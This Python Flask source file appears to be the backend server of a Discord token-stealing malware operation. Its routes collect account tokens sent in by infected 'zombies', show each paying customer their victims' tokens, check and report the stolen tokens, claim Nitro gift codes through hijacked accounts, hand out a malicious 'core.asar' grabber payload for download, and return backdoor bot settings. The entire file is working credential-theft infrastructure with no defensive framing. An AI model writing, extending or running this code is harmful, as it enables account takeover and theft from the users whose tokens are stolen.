import sys
sys.path.insert(0,'./class')

from flask import render_template, request, render_template_string, send_file
from Cache import Cache
from Utils import Utils
import flask, json


class Api():
    def __init__(self, port, config):
        self.Cache    = Cache('./Data/Account.json', './Data/Zombies.json', config['HOOK'])
        self.base_api = config['API']['BASE']
        self.app      = flask.Flask(__name__)
        self.Utils    = Utils(config['API']['OWNER_TOKEN'])
        app           = self.app
        self.prt      = port


        @app.route('/', methods= ['GET'])
        def send_index():
            return render_template('index.html'), 201

        @app.errorhandler(404)
        def not_found(error):
            return render_template('404.html'), 404

        @app.errorhandler(500)
        def internal_error(error):
            return render_template('404.html'), 500
        
        @app.route(f'{self.base_api}/send-token')
        def send_token():
            self.Cache.add_zombie(request.args.get('token'))
            return 'ok'

        # Peux êre opti pour la recherche | where?
        @app.route('/token', methods= ['GET'])
        def token():
            key = request.args.get('key')
            with open('./Data/Account.json', 'r') as database:
                db = json.load(database)

                victim_to_send  = []
                victims = []

                for acc in db['ACCOUNTS']:
                    if key in config['API']['ADMIN_KEYS']:
                        break
                    elif db['ACCOUNTS'][acc]['KEY'] == key:
                        victims = db['ACCOUNTS'][acc]['VICTIMS']
                        break
                    else:
                        return render_template('error.html')

                with open('./Data/Zombies.json') as zombies_database:
                    zb_db = json.load(zombies_database)

                    for zombie in zb_db['Zombies']:
                        if (zb_db['Zombies'][zombie]['Token'])[:24] in victims or key in config['API']['ADMIN_KEYS']:
                            victim_to_send.append(zb_db['Zombies'][zombie])
                    
                    return render_template('token.html', database= victim_to_send)

        @app.route('/check-tokens', methods= ['GET'])
        def check_tokens():
            self.Cache.check_zombies()
            self.Cache.send_report()
            return render_template('index.html'), 201

        @app.route(f'{self.base_api}/claim-nitro', methods= ['POST'])
        def claim_nitro():
            self.Utils.Claim_Nitro(request.args.get('code'), request.args.get('channel'))
            return 'ok', 201

        @app.route(f'{self.base_api}/download-core', methods= ['GET'])
        def download_core():
            return send_file('./Grabber/src/core.asar', as_attachment=True)

        @app.route(f'{self.base_api}/get-all-tokens', methods= ['GET'])
        def send_all_tokens():
            return self.Cache.get_all_zombies()
            
        @app.route(f'{self.base_api}/get-bot-infos', methods= ['GET'])
        def get_bot_info():
            return config['BACKDOOR_BOT_INFOS']

    def start(self):
        self.Cache.load_tokens()
        self.Cache.check_zombies()
        self.Cache.send_report()
        self.app.run(host= '0.0.0.0', port= self.prt)


if __name__ == '__main__':
    with open('./config.json', 'r+') as config_file:
        config = json.load(config_file)
        Api(config['API']['PORT'], config).start()